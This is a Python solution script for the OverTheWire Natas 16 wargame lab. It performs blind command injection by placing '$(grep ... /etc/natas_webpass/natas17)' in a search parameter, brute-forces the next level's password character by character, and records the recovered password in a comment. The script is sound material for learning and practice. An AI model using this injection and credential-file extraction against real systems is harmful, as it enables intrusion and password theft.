import string

import requests

import natas15


def payload(s: str) -> str:
    return "aardvark$(grep {s} /etc/natas_webpass/natas17)".format(s=s)


def solution(password: str = None) -> str:
    url = "http://natas16.natas.labs.overthewire.org"
    username = "natas16"
    if not password:
        password = natas15.solution()

    # This is similar to natas10 except that there are more illegal
    # characters. It's going to be trickier to get command output
    # directly. We can use a similar technique to natas15 and iterate
    # through characters to build the password but using Bash command
    # substitution rather than SQL.

    choices = string.ascii_letters + string.digits
    PASSWORD_LENGTH = 32
    known = ""
    auth = (username, password)

    # Make a single pass through possible characters to reduce the
    # number of guesses.
    for choice in choices:
        params = {
            "needle": payload("{choice}".format(choice=choice)),
            "submit": "Search",
        }
        r = requests.get(url, auth=auth, params=params)
        if "aardvark" not in r.text:
            known += choice
    natas17_password = ""
    while len(natas17_password) < PASSWORD_LENGTH:
        for choice in known:
            needle = payload(
                "^{password}{choice}".format(
                    password=natas17_password, choice=choice
                )
            )
            params = {"needle": needle, "submit": "Search"}
            r = requests.get(url, auth=auth, params=params)
            if "aardvark" not in r.text:
                natas17_password += choice
    # 8Ps3H0GWbn5rd9S7GmAdgQNdkhPkq9cw
    return natas17_password
